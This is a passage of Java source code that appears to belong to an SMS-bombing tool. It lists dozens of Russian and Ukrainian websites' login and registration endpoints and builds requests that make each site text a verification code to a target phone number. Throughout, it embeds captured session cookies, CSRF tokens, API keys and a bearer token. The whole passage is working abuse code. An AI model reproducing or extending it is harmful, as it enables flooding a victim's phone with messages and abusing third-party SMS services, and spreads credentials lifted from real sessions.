                    builder.addHeader("Cookie", "SERVERIDN=srv-nbe-03|YeQqC|YeQoz; _def_ne_deli=38129790841; uid=a98eab61-5a9c-47b9-b465-fef97dbcd522; cAuth_People_id=1321615; cAuth_People_time=1642342632408; cAuth_People_key=d6979f8e5ac17a3727d948f93d024e8f");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("query", "    mutation loginOrRegisterBySms($phone: String!, $code: Int, $action: PeopleSmsAction, $partnerId: Int){      loginOrRegisterBySms(phone: $phone, code: $code, partnerId: $partnerId, action: $action) {        success        info        people {          id          email          cookie_id          cartCookieId          status_id          settingsItem {            epp_catalog            catalog_sorting          }        }        error        errorCode      }    }  ");
                        json.put("variables", new JSONObject()
                                .put("action", "LOGIN")
                                .put("code", null)
                                .put("partnerId", null)
                                .put("phone", getFormattedPhone()));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://ru.shein.com/user/auth/sendcode?_lang=ru&_ver=1.1.8", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("alias_type", "2");
                    builder.add("alias", phone);
                    builder.add("scene", "phone_login_register_verify");
                    builder.add("third_party_type", "8");
                    builder.add("area_code", "7");
                    builder.add("area_abbr", "RU");
                }
            },

            new ParamsService("https://www.winelab.ru/login/send/confirmationcode", 7) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("number", format(phone, "7(***)***-**-**"));
                }
            },

            new FormService("https://samurai.ru/local/ajax/login_reg.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("user_tel", format(phone, "+7 (***) ***-**-**"));
                    builder.add("user_password", getUserName());
                    builder.add("do", "reg");
                }
            },

            new FormService("https://defile.ru/") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "PHPSESSID=oj08huc3bh74otl9tci0707mpl; was101120_2=true; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A10%2C%22EXPIRE%22%3A1642539540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("component", "bxmaker.authuserphone.login");
                    builder.add("sessid", "f07348fa8faef83c25c3b1a3d54f4678");
                    builder.add("method", "sendCode");
                    builder.add("phone", getFormattedPhone());
                }
            },

            new JsonService("https://api.raketaapp.com/v1/auth/otps?ngsw-bypass=true") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://sushiicons.com.ua/kiev/index.php?route=common/cart/ajaxgetcoderegister", 380) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("firstname", getRussianName());
                    builder.add("phone", format(phone, "+380 (**) ***-**-**"));
                    builder.add("birthday", "2005-03-05");
                }
            },

            new JsonService("https://ucb.z.apteka24.ua/api/send/otp") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://ab.ua/api/users/register/") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("email", getEmail());
                        json.put("name", getUserName());
                        json.put("phone", "+" + getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://mob-app.rolf.ru/api/v4/auth/register/request-sms-code") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("accept-language", "uk");
                    builder.addHeader("accept-encoding", "gzip");
                    builder.addHeader("user-agent", "okhttp/3.14.9");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://e-solution.pickpoint.ru/mobileapi/17100/sendsmscode") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("User-Agent", "Application name: pickpoint_android, Android version: 29, Device model: Mi 9T Pro (raphael), App version name: 3.9.0, App version code: 69, App flavor: , Build type: release");
                    builder.addHeader("Connection", "Keep-Alive");
                    builder.addHeader("Accept-Encoding", "gzip");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("PhoneNumber", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://xn--90aamkcop0a.xn--p1ai/api/v5/user/start-authorization", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone, "+7 *** ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone, "+7 *** ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://mirage.ru/api/ajax.php")
                            .post(RequestBody.create("------WebKitFormBoundarylD2tjgLGIApyeAbe\n" +
                                    "Content-Disposition: form-data; name=\"phone\"\n\n" +
                                    format(phone, "+7 (***) ***-**-**") +
                                    "\n------WebKitFormBoundarylD2tjgLGIApyeAbe\n" +
                                    "Content-Disposition: form-data; name=\"func\"\n\n" +
                                    "auth_send_code\n" +
                                    "------WebKitFormBoundarylD2tjgLGIApyeAbe\n" +
                                    "Content-Disposition: form-data; name=\"module\"\n\n" +
                                    "cabinet\n" +
                                    "------WebKitFormBoundarylD2tjgLGIApyeAbe--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundarylD2tjgLGIApyeAbe")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://avilon.ru/ajax/modal/auth.php", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.43");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("action", "1");
                    builder.add("step", "1");
                    builder.add("template", "mobile");
                    builder.add("phone", format(phone, "+7 *** *** ** **"));
                }
            },

            new ParamsService("https://fe.dominospizza.ru/api/authentication/sendVerificationSms", "POST", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("authorization", "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.lk7imFwFM9_w7KDujmn0jxArTGubuk-GZOw2r-RGAGeV1BDiFJZJzQ.AFBzB-1QZo01LFVo-c1X6w.7YADNKglX4DWWqFyz09vl9ze0KySLLHiDvIiQYef02c_kmrDnFBmPKibAR5EVREzZRTmN4sJ6lFNwYLeMtOaqrNWyJGz3zcYoahvjcjB5B9mCfLcVX1ugbCvYpbimvACn4P613afErS_0VvShR8vsdv3T3z6q5qx3w9CmuDLkzUUnqJ8BvO8kafNQQsUhZ6vJBoxv6cLf4UKNzHwGFU84g6kx2aBP2jJV8H6bpzbRqRsGWKWxb46ZKW01Cs5-BesuhNN25euWpY4uwYkM0Lqz6UX9_Hu0b7cZyH6JOy_H_y6aHZm1mZdiWex_FSbIf6it2_oZgsRFQLMPRqwfl9JXeCLrtaXipbwUjrFvaOC3pnEgYZ_y0iiCgse_i1tneeHgwQm7sjM7qEskqLPkqXOe2rCqn3mjFtfMAw95nrOXPQQ38UqEAdWUvDJDh141WYLw-wLfKjONldE0b-dNk5coKeptItF-0abCWgq6s6giAs.JZ-M2bpaATtWYaLPm3-hqA");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phoneNumber", phone);
                }
            },

            new JsonService("https://beloris.ru/ajax/users/send_sms_login", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("x-csrf-token", "");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone, "+7(***) ***-****"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://vyksa.fitauto.ru/users.getsmscode.fn", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", phone);
                        json.put("token", "QJB68LnzWeFWphIwFSNW0oEiqDmKKc8lJ8TbU7Wm");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://m.avtoall.ru/cart/order/api/phone", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "PHPSESSID3=1lld5u0hic440f37ilipkcaq71; out_location_data=C%3A15%3A%22OutLocationData%22%3A48%3A%7Ba%3A2%3A%7Bs%3A10%3A%22locationId%22%3Bb%3A0%3Bs%3A9%3A%22confirmed%22%3Bb%3A0%3B%7D%7D; split=split-a; _ga=GA1.2.876559525.1644854748; _gid=GA1.2.144615146.1644854748; _ym_uid=1644854749375021234; _ym_d=1644854749; lastHost=m.avtoall.ru; _ym_isad=2; _dn_sid=ee0c8210-3e11-4fed-ba9f-05ed60687722; location_data=C%3A12%3A%22LocationData%22%3A55%3A%7Ba%3A2%3A%7Bs%3A10%3A%22locationId%22%3Bs%3A4%3A%222941%22%3Bs%3A9%3A%22confirmed%22%3Bb%3A1%3B%7D%7D");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", format(phone, "+7 (***) ***-****"));
                    builder.addQueryParameter("key", "51df7fb4cfc3e8e518fa346710b7712e");
                }
            },

            new JsonService("https://dnipro-m.ua/phone-verification/") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("x-csrf-token", "2Ame-KM1DXP3ATTtBQ1ks-pj771B-P6hyQMiztAeYkLoZ8qOwGVDJJxScIY1PRDfnAWr9QSvie2cUXCNqlI9LA==");
                    builder.addHeader("Cookie", "PHPSESSID=rshi0gctd3nsddcs58l865tu6q; session_hash=8d5affc2cad1a00ddfe8fa3f067e13b8; ab_1=2; logged_in_as=c38cdce2f7ef0094f910220849aee84a3613eb500f51202d492282b1d416cf91a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22logged_in_as%22%3Bi%3A1%3BN%3B%7D; manager_store=9f8a6a348bfddc4e1484e8c2b620e744a46020143d5011858217908bfa12f43ca%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22manager_store%22%3Bi%3A1%3BN%3B%7D; language=1f1c77ed088a525c9d9a3ee0075b68d6a50c75278eb07b95c9c6c8adf4633886a%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22language%22%3Bi%3A1%3Bs%3A2%3A%22ru%22%3B%7D; translations_pushed=92f83c1f3a434aeae744854c974cdb236df315cbe39e518ed7234b1ea9a0cd88a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22translations_pushed%22%3Bi%3A1%3Bi%3A1%3B%7D; _csrf-frontend=8ed0eca3dbc58c275be1804686501b2aa4c60f1f562d2e2098d3651b66a2af18a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%220nTvcPNWkSDk00tlvfDHEWwLURRCzL_n%22%3B%7D; _gcl_au=1.1.439638018.1644856370; _gid=GA1.2.162073021.1644856370; _dc_gtm_UA-87493814-1=1; sc=3E8EF674-EB02-A8ED-92DC-DA62D3B448B9; _fbp=fb.1.1644856370513.191414281; _hjSessionUser_1116764=eyJpZCI6IjExMzBlN2U4LWFhODAtNTRlZi1iODY2LWIyMDgzMWViNjVmOCIsImNyZWF0ZWQiOjE2NDQ4NTYzNzExMjUsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_1116764=eyJpZCI6ImZjYzMyNmRhLTNkZTUtNGM1ZC1iMTE2LTVjNjNhN2JlNmQ5MSIsImNyZWF0ZWQiOjE2NDQ4NTYzNzExNTYsImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0; _ga_1QMTESJ6M0=GS1.1.1644856371.1.0.1644856371.60; _ga=GA1.2.683370447.1644856370; _gat_UA-87493814-1=1; csfp=47a8c34d1a498bd8daee7742cb48c821");
                    builder.addHeader("x-requested-with", "XMLHttpRequest");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://api.raketaapp.com/v1/auth/otps?ngsw-bypass=true") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://c.ua/index.php?route=account/loginapples/sendSMS", 380) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("route", "account/loginapples/sendSMS");
                    builder.addQueryParameter("phone", "0" + phone);
                }
            },

            new JsonService("https://oauth.av.ru/check-phone", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "rrpvid=50921543596612; rcuid=61fc0f0fd6d3b0000109d97d; _fbp=fb.1.1644942354474.861857136; scarab.visitor=%221DFC214A72CE04B6%22; _gcl_au=1.1.468949459.1644942355; tmr_lvid=8d216dc77735473614cf84f36356f5e2; tmr_lvidTS=1644942355170; _ga=GA1.2.1631079387.1644942355; _gid=GA1.2.1730181075.1644942355; _dc_gtm_UA-44837825-1=1; _ym_d=1644942355; _ym_uid=1644942355426542771; _ym_isad=2; _ym_visorc=w; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=8c6de077-7f3b-4af2-8e06-9f0243dab8e8; session-cookie=16d4025de27335c1cb1a64b9beb261f52d904910639583d6de7337b0b56dab805408c3b797154802caa253c26623b9d2; XSRF-TOKEN=eyJpdiI6IlBmdlhGTXZrbmk1U1YxaW14TWlaclE9PSIsInZhbHVlIjoieE9zYU9rR3hEZ2tsWGROWFRFVmlUZU5sVXFrZG00bFB0bUZ6ZE5wMWN1eW9ZcnBVU1poT3RWZkw1QUEycG9mTiIsIm1hYyI6ImUzOWFhYzEwMzNkN2M1ZGE0MmRmZDMyMzQ0ZTc0NWViNWE5MGNjNzUwMTRlOTkxNjA5Y2IxNjA3NjJjNzg0MzAifQ%3D%3D; laravel_session=eyJpdiI6Ikp0UndrSHhhVmJwWVhoaERpSmJOYmc9PSIsInZhbHVlIjoiRldtOE5KY01iSFh3RnRVQ0liaE9mQXpxYjg5ekFhSGpiWHZLRWVYTVlNd3BPUytmQmYwNFB3WHZnUEV4NFBySSIsIm1hYyI6IjIyZjhkNWRiYzFkYTllNzM4YWM4MjliMDMwYzE0NDMwMTdiYzAwNmY0YmZiMmEzMWM0MTExM2UwN2MwMGE0M2EifQ%3D%3D; font=phone; _dc_gtm_UA-73212427-1=1; tmr_reqNum=23; tmr_detect=0%7C1644942368834");
                    builder.addHeader("x-ajax-token", "5592b90ee98edbba757b233367431ad8e130b84cbeb2599262f0ebf957f36b68");
                    builder.addHeader("x-csrf-token", "QpZQnv8B7Myy3yU2TYQqVwjVsM4iPL3CarHb5M2g");
                    builder.addHeader("x-xsrf-token", "eyJpdiI6IlBmdlhGTXZrbmk1U1YxaW14TWlaclE9PSIsInZhbHVlIjoieE9zYU9rR3hEZ2tsWGROWFRFVmlUZU5sVXFrZG00bFB0bUZ6ZE5wMWN1eW9ZcnBVU1poT3RWZkw1QUEycG9mTiIsIm1hYyI6ImUzOWFhYzEwMzNkN2M1ZGE0MmRmZDMyMzQ0ZTc0NWViNWE5MGNjNzUwMTRlOTkxNjA5Y2IxNjA3NjJjNzg0MzAifQ==");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone, "+7 (***) ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://www.farpost.ru/sign/code/4f4fa7e19e3ba823af9bfc8af95bfd3d/send") {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("sign", getFormattedPhone());
                    builder.addQueryParameter("return", "/");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "ring=09090bc822948c9b09190782e129530d; _gid=GA1.2.1845397233.1644852398; PHPSESSID=09090bc822948c9b09190782e129530d; _ga_G0RWKN84TQ=GS1.1.1644942896.3.1.1644942996.0; _gat=1; _ga=GA1.1.228350603.1644852398");

                    return super.buildRequest(builder);
                }
            },

            new FormService("https://client.taximaxim.com/ru-RU/site/send-code/?tax-id=yFL33BWu8yOEhqH0C0bV8BfGWKFjFba7Sxdwcdfppe71sHd4uxidkbS5%2B%2BYzBsW%2BiAH1yXFh2Na5bJdvZaNNTNRa6w%2BY1xpwqd1XUGEIcJc%3D") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("_csrf", "kxA-oV0mlFWdBCIB7ILw3rimGOLKolF08U3T-xRAHODhR27nE3LDANN1Flmt27uT7tZVpqHsJhCmAJ-OLAMurw==");
                    builder.add("LoginForm[org]", "maxim");
                    builder.add("LoginForm[country]", "KZ");
                    builder.add("LoginForm[baseId]", "2647");
                    builder.add("LoginForm[phone]", format(phone, "+7(***)***-**-**"));
                    builder.add("LoginForm[code]", "");
                    builder.add("LoginForm[sendCodeType]", "0");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "_gcl_au=1.1.1590444723.1644943405; ga4_ga=GA1.1.1194255158.1644943405; _fbp=fb.1.1644943405522.1545141459; tmr_lvid=240c8ea73522f433a343f40b415fe8da; tmr_lvidTS=1644943405689; _ga=GA1.2.1194255158.1644943405; _gid=GA1.2.856429364.1644943406; _gat=1; _ym_uid=1644943406270600745; _ym_d=1644943406; _ym_isad=2; _ym_visorc=w; TAXSEE_V3MAXIM=l3thvebia464dbs2koje0n3hgv; __finger_print_hash=6e47d4b191dc6ac30a1d7606a5fa7a7a72cb20cc9e0853935099d982901443b9a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22__finger_print_hash%22%3Bi%3A1%3Bs%3A32%3A%2264d178a6ae165b1da838d27d84a1e244%22%3B%7D; __intl=1a6c3f19d825211b4b399b7960038c6d1a93438adf1deb9825ed10de11d478f0a%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22__intl%22%3Bi%3A1%3Bs%3A5%3A%22ru-RU%22%3B%7D; _csrf=d92a7efa1c07f1ffe242d52d34c2845fc5430ca22a0a772cb9ff56f9528cb7faa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rWPFNTWUNq4XAYKMVpMDkNwdWMLu8C2O%22%3B%7D; ga4_ga_21NZZ0KWNK=GS1.1.1644943405.1.1.1644943408.57; tmr_reqNum=4");
                    builder.addHeader("X-CSRF-Token", "kxA-oV0mlFWdBCIB7ILw3rimGOLKolF08U3T-xRAHODhR27nE3LDANN1Flmt27uT7tZVpqHsJhCmAJ-OLAMurw==");

                    return super.buildRequest(builder);
                }
            },

            new JsonService("https://www.kolesa-darom.ru/ajax/user/register") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("X-Bitrix-Csrf-Token", "80d2bb6c5a485281fede4066666273ab");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("approveRule", true);
                        json.put("phoneNumber", getFormattedPhone());
                        json.put("step", new JSONObject().put("requestCode", "requestCode"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://api.pizzasan.ru/api/clients/do_register")
                            .post(RequestBody.create("------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
                                    "Content-Disposition: form-data; name=\"name\"\n" +
                                    "\n" +
                                    "\n" +
                                    "------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
                                    "Content-Disposition: form-data; name=\"phone\"\n" +
                                    "\n" +
                                    format(phone, "8(***) ***-****") +
                                    "\n------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
                                    "Content-Disposition: form-data; name=\"password\"\n" +
                                    "\n" +
                                    "1234567\n" +
                                    "------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
                                    "Content-Disposition: form-data; name=\"password_2\"\n" +
                                    "\n" +
                                    "1234567\n" +
                                    "------WebKitFormBoundaryVtaTywrDHtBorVsK--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryVtaTywrDHtBorVsK")))
                            .build()).enqueue(callback);
                }
            },
    };
}
